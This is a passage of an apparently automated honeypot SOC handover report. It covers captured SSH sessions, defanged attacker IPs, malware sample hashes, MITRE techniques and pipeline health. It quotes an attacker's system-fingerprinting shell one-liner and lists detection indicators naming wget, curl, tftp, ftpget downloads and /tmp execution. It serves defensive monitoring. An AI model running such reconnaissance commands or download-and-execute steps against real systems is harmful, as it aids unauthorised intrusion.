| **First Seen** | 2026-08-25 06:53 |
| **Last Seen** | 2026-08-25 06:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:53:15` | `cowrie.session.connect` |
| `2026-08-25 06:53:15` | `cowrie.client.version` |
| `2026-08-25 06:53:15` | `cowrie.client.kex` |
| `2026-08-25 06:53:17` | `cowrie.login.success` |
| `2026-08-25 06:53:18` | `cowrie.session.params` |
| `2026-08-25 06:53:18` | `cowrie.command.input` |
| `2026-08-25 06:53:18` | `cowrie.command.input` |
| `2026-08-25 06:53:18` | `cowrie.command.input` |
| `2026-08-25 06:53:18` | `cowrie.command.input` |
| `2026-08-25 06:53:18` | `cowrie.command.input` |
| `2026-08-25 06:53:18` | `cowrie.command.success` |
| `2026-08-25 06:53:18` | `cowrie.command.input` |
| `2026-08-25 06:53:18` | `cowrie.command.input` |
| `2026-08-25 06:53:18` | `cowrie.command.input` |
| `2026-08-25 06:53:18` | `cowrie.command.input` |
| `2026-08-25 06:53:18` | `cowrie.log.closed` |
| `2026-08-25 06:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137c2cdd68ff

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-25 06:54 |
| **Last Seen** | 2026-08-25 06:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:54:23` | `cowrie.session.connect` |
| `2026-08-25 06:54:23` | `cowrie.client.version` |
| `2026-08-25 06:54:23` | `cowrie.client.kex` |
| `2026-08-25 06:54:24` | `cowrie.login.success` |
| `2026-08-25 06:54:25` | `cowrie.session.params` |
| `2026-08-25 06:54:25` | `cowrie.command.input` |
| `2026-08-25 06:54:25` | `cowrie.command.input` |
| `2026-08-25 06:54:25` | `cowrie.command.input` |
| `2026-08-25 06:54:25` | `cowrie.command.input` |
| `2026-08-25 06:54:25` | `cowrie.command.input` |
| `2026-08-25 06:54:25` | `cowrie.command.success` |
| `2026-08-25 06:54:25` | `cowrie.command.input` |
| `2026-08-25 06:54:25` | `cowrie.command.input` |
| `2026-08-25 06:54:25` | `cowrie.command.input` |
| `2026-08-25 06:54:25` | `cowrie.command.input` |
| `2026-08-25 06:54:26` | `cowrie.log.closed` |
| `2026-08-25 06:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.77.179[.]139` | **30** | 2026-08-25 05:10 | 2026-08-25 05:11 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `34.79.176[.]96` | **30** | 2026-08-25 05:58 | 2026-08-25 05:59 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.138[.]191` | **25** | 2026-08-25 04:55 | 2026-08-25 06:34 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `134.209.229[.]23` | **5** | 2026-08-25 05:58 | 2026-08-25 06:31 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-25 04:55 | 2026-08-25 06:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | **3** | 2026-08-25 06:36 | 2026-08-25 06:44 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `199.45.155[.]84` | **2** | 2026-08-25 05:08 | 2026-08-25 05:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-08-25 06:28 | 2026-08-25 06:28 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `143.198.115[.]76` | 1 | 2026-08-25 05:13 | 2026-08-25 05:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `164.92.241[.]237` | 1 | 2026-08-25 05:28 | 2026-08-25 05:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.239.64[.]155` | 1 | 2026-08-25 05:23 | 2026-08-25 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-08-25 06:38 | 2026-08-25 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]251` | 1 | 2026-08-25 06:14 | 2026-08-25 06:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-25 05:39 | 2026-08-25 05:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.107.142[.]38` | 1 | 2026-08-25 06:03 | 2026-08-25 06:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-08-25 06:39 | 2026-08-25 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-08-25 05:40 | 2026-08-25 05:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]107` | 1 | 2026-08-25 05:47 | 2026-08-25 05:47 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]146` | 1 | 2026-08-25 05:27 | 2026-08-25 05:27 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]212` | 1 | 2026-08-25 06:08 | 2026-08-25 06:08 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `92.204.138[.]191` | US | Host Europe GmbH | **100** ⚠️ | 25 |
| `168.110.102[.]254` | KR | Oracle Corporation | **100** ⚠️ | 3 |
| `164.92.241[.]237` | DE | DigitalOcean, LLC | **100** ⚠️ | 6 |
| `80.94.92[.]55` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `39.107.142[.]38` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 11 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 7 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `165.154.147[.]69` | MY | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 284 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 277 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 52 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 50 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 49 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 9 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 403 cases |
| Tool 34  | Credential Extractor        | ✅ 286 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (3.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 18 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 277 priority case(s) shown individually · 20 recon entry/entries in table (7 group(s) consolidating 100 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-25T08:48:55Z_
